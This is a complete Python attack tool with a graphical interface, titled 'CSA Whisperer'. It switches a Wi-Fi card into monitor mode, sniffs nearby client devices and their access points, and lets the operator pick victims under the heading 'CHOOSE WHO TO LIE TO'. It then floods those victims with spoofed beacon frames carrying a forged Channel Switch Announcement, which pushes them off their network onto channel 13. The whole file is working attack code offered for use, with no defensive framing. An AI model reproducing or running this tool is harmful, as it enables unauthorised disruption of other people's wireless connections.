import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class CSAWhispererGUI:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {} # {MAC: {"BSSID": bssid, "RSSI": rssi, "CH": ch}}
        self.lying_to = set() # Set of currently targeted MACs
        self.running = True
        self.scanning = True
        
        self.setup_monitor()
        
        # --- UI Setup ---
        self.root = tk.Tk()
        self.root.title("CSA Whisperer v2.0 - Stealth Logic")
        self.root.geometry("850x650")
        self.root.configure(bg="#050505")

        title = tk.Label(self.root, text="CHOOSE WHO TO LIE TO", fg="#00FF41", bg="#050505", font=("Courier", 14, "bold"))
        title.pack(pady=10)

        # Multiple selection listbox
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), 
                                 selectmode="multiple", height=18)
        self.listbox.pack(padx=10, pady=5, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)

        tk.Button(btn_frame, text="ENGAGE WHISPER", command=self.toggle_lie, bg="#880000", fg="white", width=20).pack(side="left", padx=5)
        tk.Button(btn_frame, text="STOP ALL", command=self.stop_all, bg="#444", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="REPAIR & EXIT", command=self.shutdown, bg="#222", fg="#ff0000", width=15).pack(side="left", padx=5)

        self.status = tk.Label(self.root, text="Scanner Live...", bg="#050505", fg="#00FF41")
        self.status.pack()

        # Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()
        threading.Thread(target=self.whisper_engine, daemon=True).start()

    def setup_monitor(self):
        os.system("sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def hopper(self):
        ch = 1
        while self.running:
            if not self.lying_to: # Only hop if not attacking
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.current_ch = ch
                ch = (ch % 13) + 1
                time.sleep(0.5)
            else:
                time.sleep(1)

    def scanner(self):
        def callback(pkt):
            if pkt.haslayer(Dot11) and self.scanning:
                dot11 = pkt.getlayer(Dot11)
                if dot11.addr2 and dot11.addr3 and dot11.addr2 != dot11.addr3:
                    client = dot11.addr2
                    if client not in self.discovered and client != "ff:ff:ff:ff:ff:ff":
                        self.discovered[client] = {"BSSID": dot11.addr3, "CH": self.current_ch}
                        self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.discovered.items():
            status = " [ACTIVE LIE] " if mac in self.lying_to else " [CLEAN] "
            self.listbox.insert(tk.END, f"{status} {mac} | AP: {info['BSSID']} | CH: {info['CH']}")

    def toggle_lie(self):
        selected_indices = self.listbox.curselection()
        if not selected_indices: return
        
        for i in selected_indices:
            mac = list(self.discovered.keys())[i]
            if mac in self.lying_to:
                self.lying_to.remove(mac)
                print(f"[*] Stopped lying to {mac}")
            else:
                # Lock to the channel of the FIRST selected target for the injection
                target_ch = self.discovered[mac]["CH"]
                os.system(f"sudo iw dev {self.iface} set channel {target_ch}")
                self.lying_to.add(mac)
                print(f"[*] Started lying to {mac} on CH {target_ch}")
        
        self.refresh_ui()

    def whisper_engine(self):
        # Ghost Channel 13 is often 'off-limits' or empty in many regions
        csa_ie = Dot11Elt(ID=37, len=3, info=chr(1) + chr(13) + chr(1))
        while self.running:
            for mac in list(self.lying_to):
                bssid = self.discovered[mac]["BSSID"]
                # Build spoofed Beacon with the 'Move' command
                pkt = RadioTap()/Dot11(addr1=mac, addr2=bssid, addr3=bssid)/Dot11Beacon()/csa_ie
                sendp(pkt, iface=self.iface, verbose=False, count=2)
            time.sleep(0.1)

    def stop_all(self):
        self.lying_to.clear()
        self.refresh_ui()

    def shutdown(self):
        self.running = False
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type managed")
        os.system(f"sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 whisper_gui.py [iface]")
    else: CSAWhispererGUI(sys.argv[1]).root.mainloop()
